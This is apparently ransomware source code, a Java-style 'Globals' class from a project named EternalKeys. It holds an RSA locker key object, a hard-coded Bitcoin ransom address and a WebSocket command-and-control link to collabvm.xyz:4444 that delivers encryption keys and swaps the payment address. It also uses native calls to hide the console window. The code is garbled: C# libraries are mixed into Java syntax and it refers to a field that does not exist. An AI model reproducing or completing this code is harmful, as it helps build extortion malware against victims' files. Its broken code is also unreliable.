package EternalKeys;

import System.*;
import System.Collections.Generic.*;
import System.Windows.Forms.*;
import System.Runtime.InteropServices.*;
import Newtonsoft.Json.*;


public class Globals
{
	public static ArrayList Encrypted = new ArrayList();
	public static WebSocket ws = new WebSocket("ws://collabvm.xyz:4444/rs", new String[0]);
	public static LockerEngine.RSA.EncryptorRSAKeys Keys = new LockerEngine.RSA.EncryptorRSAKeys();
	public static String BitcoinAddr = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";

	public static native IntPtr GetConsoleWindow();
	static
	{
		System.loadLibrary("kernel32");
	}

	public static native boolean ShowWindow(IntPtr hWnd, int nCmdShow);
	static
	{
		System.loadLibrary("user32");
	}

	public static void SendCMD(String name, String args)
	{
		Globals.ws.Send(JsonConvert.SerializeObject((Object)new cmd(name, args)));
	}

	public static void Ws_OnMessage(Object sender, EventArgs e)
	{
		cmd cmd = JsonConvert.DeserializeObject((String)e.ToString(), cmd.class);
		if (cmd._name.equals("public_key"))
		{
			Globals.Key.PublicKey = cmd._args;
			int num = MessageBox.Show(cmd._args);
		}
		else if (cmd._name.equals("welcome"))
		{
			Globals.Key.PublicKey = cmd._args;
		}
		else if (cmd._name.equals("private_key"))
		{
			Globals.Key.PrivateKey = cmd._args;
		}
		else if (cmd._name.equals("key"))
		{
			Globals.BitcoinAddr = cmd._args;
		}
	}

	public static class cmd
	{
		public String _name;
		public String _args;

		public cmd(String name, String args)
		{
			this._name = name;
			this._args = args;
		}
	}
}
